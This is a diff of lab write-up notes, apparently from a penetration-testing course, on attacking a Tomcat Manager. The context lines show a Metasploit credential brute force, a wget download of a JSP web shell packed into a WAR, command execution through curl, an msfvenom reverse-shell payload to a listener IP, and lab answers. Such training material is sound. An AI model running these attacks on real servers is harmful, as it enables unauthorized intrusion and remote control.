@@ -2,7 +2,7 @@
 ## Tomcat Manager - Login Brute Force
 We can use the `auxiliary/scanner/http/tomcat_mgr_login` Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this.
 
-```sh
+```shellsession
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
@@ -15,7 +15,7 @@ Many Tomcat installations provide a GUI interface to manage the application. Thi
 
 The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.
 
-```sh
+```shellsession
 $ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 $ zip -r backup.war cmd.jsp 
 
@@ -24,7 +24,7 @@ $ zip -r backup.war cmd.jsp
 
 This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.
 
-```sh
+```shellsession
 $ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 
 <HTML><BODY>
@@ -42,7 +42,7 @@ uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
 
 We could also use `msfvenom` to generate a malicious WAR file. The payload `java/jsp_shell_reverse_tcp` will execute a reverse shell through a JSP file. 
 
-```sh
+```shellsession
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
 
 Payload size: 1098 bytes
@@ -77,7 +77,7 @@ results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the
 ## Questions
 1. Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? **Answer: tomcat**
    - Run the metasploit module for bruteforcing → found:
-        ```sh
+        ```shellsession
         [msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login
         [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
         VHOST => web01.inlanefreight.local
@@ -96,7 +96,7 @@ results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the
 2. What is the password? **Answer: root**
 3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt **Answer:**
    - Login to the manager account and upload the webshell:
-        ```sh
+        ```shellsession
         $ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
         $ zip -r backup.war cmd.jsp 
 
